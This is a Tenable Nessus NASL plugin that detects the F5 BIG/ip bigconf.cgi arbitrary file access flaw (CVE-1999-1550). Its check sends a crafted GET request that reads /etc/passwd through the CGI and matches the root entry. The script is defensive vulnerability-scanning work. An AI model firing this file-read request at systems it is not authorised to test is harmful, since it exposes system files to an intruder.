#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10027);
 script_bugtraq_id(778);
 script_cve_id("CVE-1999-1550");
 script_xref(name:"OSVDB", value:"22");
 script_version ("$Revision: 1.26 $");
 
 script_name(english:"F5 BIG/ip bigconf.cgi file Parameter Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/bigconf.cgi");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A CGI with known security vulnerabilities is installed on the remote\n",
     "web server."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The 'bigconf' CGI is installed.  This CGI has a well-known security\n",
     "flaw that allows an attacker to execute arbitrary commands with the\n",
     "privileges of the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/1543.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from /cgi-bin."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "httpver.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
req = string(dir, "/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;");
buf = http_send_recv3(method:"GET", item:req, port:port);
if( isnull(buf) ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf[2]))security_hole(port);
}
